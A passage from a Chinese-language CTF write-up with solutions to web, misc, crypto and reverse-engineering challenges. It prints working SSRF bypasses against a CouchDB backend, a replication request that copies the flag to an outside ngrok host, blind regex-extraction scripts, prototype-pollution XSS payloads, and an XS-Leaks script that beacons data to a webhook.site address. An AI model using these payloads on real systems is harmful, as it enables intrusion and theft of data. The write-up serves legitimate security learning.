Main.db.createUser(username, password); Main.db.addUserToDatabase(username, username); JSONObject flagDoc = new JSONObject(); flagDoc.put(\u0026#34;flag\u0026#34;, Main.flag); Main.db.insertDocumentToDatabase(username, flagDoc.toString()); ctx.result(\u0026#34;success\u0026#34;); } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } } 当发出一个请求 带着username和passwd时，它会调用createUser()创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI\npublic static void testAPI(Context ctx) { String url = (String)ctx.queryParam(\u0026#34;url\u0026#34;, String.class).get(); String method = (String)ctx.queryParam(\u0026#34;method\u0026#34;, String.class).get(); String data = ctx.queryParam(\u0026#34;data\u0026#34;); try { URL urlURI = new URL(url); if (urlURI.getHost().contains(\u0026#34;couchdb\u0026#34;)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } catch (MalformedURLException e) { throw new BadRequestResponse(\u0026#34;Input URL is malformed\u0026#34;); } try { if (method.equals(\u0026#34;GET\u0026#34;)) { JSONObject jsonObj = HttpClient.getAPI(url); String str = jsonObj.toString(); } else if (method.equals(\u0026#34;POST\u0026#34;)) { JSONObject jsonObj = HttpClient.postAPI(url, data); String stringJsonObj = jsonObj.toString(); if (Utils.containsFlag(stringJsonObj)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } else { throw new BadRequestResponse(\u0026#34;Request method is not accepted\u0026#34;); } } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } ctx.result(\u0026#34;success\u0026#34;); } 对给出的url（通过url参数进行提交）进行get或者post，先检查if (urlURI.getHost().contains(\u0026quot;couchdb\u0026quot;))，如果为真直接报错；之后发出请求 如果Utils.containsFlag(stringJsonObj)为真也会报错出去\n源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai）\n本地先起一个环境，run on localhost:8080，\n$ curl localhost:8080/testAPI?url=https://couchdb:5984/\\\u0026amp;method=GET Illegal! 由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户\n$ curl http://localhost:8080/createUser?username=neptunian\\\u0026amp;password=neptunian # Creating user success $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq # Listing \u0026#34;neptunian\u0026#34; database documents, using our credentials (jq formats our JSON output) { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } } ] } $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq # Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{fake}\u0026#34; } 显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~\n$ curl -vv http://localhost:8080/testAPI?method=GET\\\u0026amp;url=http://neptunian:neptunian\\@couchdb\\:5984\\@couchdb\\:5984/neptunian ... success 这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # Simple POST Test params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; }) ) ) # Local response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 2, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } }, { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34; } } ] } # There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09! $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34;, \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; } 足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的\n而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！\n{ \u0026#34;source\u0026#34;: \u0026#34;source_db_name\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;http://dest_user:dest_password@destination_host/dest_database\u0026#34; } 至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url https://2d0a4710580a.ngrok.io，先创建数据库来便于接收之后复制的数据\n$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag {\u0026#34;ok\u0026#34;:true} 然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # POST Replication params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;source\u0026#34;: \u0026#34;neptunian\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag\u0026#34; }) ) ) # response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) response = requests.get(\u0026#39;https://requester.mc.ax/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34; } } ] } $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq { \u0026#34;_id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\u0026#34; } 好耶！复制怪好耶！\n虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~\n————以下是第二种解法: char-by-char-blind-sqli\n源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find\ncurl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \u0026#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find\u0026#39; --data \u0026#39;{\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;.*\u0026#34;}}}\u0026#39; 本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~\nimport urllib.parse import requests import json import string # first, make a request to # /createUser?username=strellicsquad\u0026amp;password=12345 alphabet = \u0026#34;etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ\u0026#34; def test_regex(regex): url = \u0026#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find\u0026#34; data = json.dumps({\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: regex}}}) r = requests.get(f\u0026#34;https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}\u0026amp;method=POST\u0026amp;data={urllib.parse.quote(data)}\u0026#34;) return \u0026#34;Something went wrong\u0026#34; in r.text flag = \u0026#34;flag{\u0026#34; while not flag.endswith(\u0026#34;}\u0026#34;): for c in alphabet: check = \u0026#34;^\u0026#34; + flag + c + \u0026#34;.*\u0026#34; if test_regex(check): print(f\u0026#34;found {c}-\u0026gt; {flag}{c}\u0026#34;) flag += c break 也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\n————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问\n我搜了一下 有相关问题的解答 但都不明确……\n从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接curl 127.0.0.1:5984也是失败，curl couchdb:5984也是失败，处理报错真是心累\nweb/requester-strikes-back  Java was found to not be the future. Can you take down requester again?\n 源码处有一处修改if (urlURI.getHost().toLowerCase().contains(\u0026quot;couchdb\u0026quot;))\n这使得我们不能用之前的Couchdb大写的方式来绕过，但是\n结合Incorrect handling of malformed authority component by URIUtils#extractHost\n我们只需要把之前的url改成http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find即可（解法二）\n解法一直接跑就行 一样能通\n相关的一些ssrf前置知识\u0026amp;url解析问题仍然可以看这里：A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai（好厉害的ppt）\n参考：wp1 wp2\nweb/pastebin-1  Ah, the classic pastebin.\npastebin-1.mc.ax\nAdmin bot\nDownloads - main.rs\n pastebin，类似留言板的样子 可以发表paste\n第一反应就是xss，试一下alert(1) 成功弹窗题目另外提供了一个/admin-bot页面，这个，妥妥的xss好吧 直接xss platform一把梭！\n***web/pastebin-2-social-edition  Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.\npastebin-2-social-edition.mc.ax\nAdmin bot\n 这次adminbot会给自己的paste下面留言回复\n显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，参考wp\n看源码\n注意到这里，如果有错误 就会设置errorContainer.innerHTML = message;，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 我们可以把error污染成任意值，message污染为xss内容和payload\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;error\u0026#34;] = \u0026#34;1\u0026#34;; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;message\u0026#34;] = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;; 当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对__proto__进行移除，但是因为上面const fieldsetName = decodeURIComponent(fieldset.name);，所以再对__proto__来一手urlencode就能绕过了\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;%255F_proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; ***web/pastebin-3  Boy, there sure are a lot of pastebins. Gotta think of new themes\u0026hellip;\nPlease put a reasonably secure password when making an account\n 还是一个很简单的页面 create paste，增加了一个搜索的功能\n先看/view路由\n我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况\n而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似${alert(1)}的东西直接就可以跑js了！\n现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔\n再看看新加入的search功能\n————这里要先插播一条知识了 XSLeaks（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见error events\nCross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ——from XSLeaks wiki\n/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400\n我们用XSLeaks wiki上给出的 probeError snippet\nfunction probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } 虽然同站的cookies（same-site cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本\nconst alphabet = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; function set() { document.cookie = `a=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` document.cookie = `b=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` } function unset() { document.cookie = `a=; domain=.pastebin-3.mc.ax` document.cookie = `b=; domain=.pastebin-3.mc.ax` } function probeError(url) { return new Promise(resolve =\u0026gt; { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; resolve(false); script.onerror = () =\u0026gt; resolve(true); document.head.appendChild(script); }); } function wait(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } (async () =\u0026gt; { let prefix = \u0026#34;flag{c00k13_b0mb1n6_15_f4k3_vu\u0026#34;; set(); navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded\u0026#39;); while (!prefix.endsWith(\u0026#39;}\u0026#39;)) { for (let i = 0; i \u0026lt; alphabet.length; i++) { let attempt = prefix + alphabet[i]; let subwindow = window.open(\u0026#34;https://pastebin-3.mc.ax/search?query=\u0026#34; + encodeURIComponent(attempt)); await wait(500); subwindow.close(); if (await probeError(\u0026#34;https://pastebin-3.mc.ax/home\u0026#34;)) { navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?\u0026#39; + attempt); unset(); prefix = attempt; break; } } } })(); 为了引入这个脚本，我们新建一个paste\n${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)} 其他几个版本的脚本：ver2 ver3\n参考：XSLeaks | Side Channel Vulnerabilities on the Web - Detection and Preventio | Flask 消息闪现\nweb/wtjs  Ya like golf? How about JS golf?\nwtjs.mc.ax | Admin bot\nDownloads: wtjs.tar\n ………………有字数限制的fuckjs，我不会构造 太痛苦了\nwp参见一张google sheet wp2\n不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅\n属实是蚌埠住了😅\n***web/MdBin  Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!\nmdbin.mc.ax\nSubmit to the admin at admin-bot.mc.ax/mdbin; the flag is in a cookie.\nDownloads: mdbin.tar.gz\n 参考：wp1 wp2\n直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！\n***web/lazy-admin  Looks like another service with no functionality. I hope the admin is doing their job\u0026hellip;\nlazy-admin.mc.ax\nDownloads: lazy-admin.tar.gz\n 参考：wp\n难，我不懂\nmisc/sanity-check  I get to write the sanity check challenge! Alright!\nflag{1_l0v3_54n17y_ch3ck_ch4ll5}\n misc/discord  Join the discord! I hear #rules is an incredibly engaging read.\n misc/compliant-lattice-feline  get a flag! nc mc.ax 31443\n *misc/the-substitution-game  nc mc.ax 31996\nDownloads: chall.py\n Markov Algorithm罢了\n参见：Markov Algorithm Online\nmisc/annaBEL-lee  sounds from a kingdom by the sea\nThe server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.\nWhat exactly is the server sending? Sometimes it makes a sound, sometimes it doesn\u0026rsquo;t. Plotting it on a chart might help you see something.\nIt might be helpful to turn your sound on, but you\u0026rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.\nThis is not audio steganography. Apologies if anyone went down that route.\nnc mc.ax 31845\n nc连入后没有任何可视的回显，但是藏在了声音信息里\n\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00 导出，有两种值：no bell(\\x00) bell(\\x07)，转化为0与1\n101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000 改为莫斯电码的样子\n.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.- 解密\nLETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L) flag{d1ng-d0n9-g0es-th3-anna-b3l}\ncrypto/scissor  I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf\nDownloads: encrypt.py\n crypto/baby  I want to do an RSA!\nDownloads: output.txt\n n: 228430203128652625114739053365339856393 e: 65537 c: 126721104148692049427127809839057445790 一点都不会crypto…… 其实查一下RSA n e c其实就能做出来后面的东西了\nRSA decryption using only n e and c 然后就会知道这个东西 Ganapati/RsaCtfTool，或者这个在线网站 RSA Cipher\n为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 整数分解工具\n之后就可以愉快的解密了！\nrev/wstrings  Some strings are wider than normal\u0026hellip;\nDownloads: wstrings\n flag{n0t_al1_str1ngs_ar3_sk1nny}\nrev/bread-making  My parents aren\u0026rsquo;t home! Quick, help me make some bread please\u0026hellip; nc mc.ax 31796\nDownloads: bread\n 参考：wp2 wp3 wp4\n我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的\nadd ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\n调试的过程是linux下的py脚本\nfrom pwn import * p = remote(\u0026quot;mc.ax\u0026quot;, 31796) p.sendlineafter(\u0026quot;bowl\u0026quot;, \u0026quot;add flour\u0026quot;) p.sendlineafter(\u0026quot;flour has been added\u0026quot;, \u0026quot;add yeast\u0026quot;) p.sendlineafter(\u0026quot;yeast has been added\u0026quot;, \u0026quot;add salt\u0026quot;) p.sendlineafter(\u0026quot;salt has been 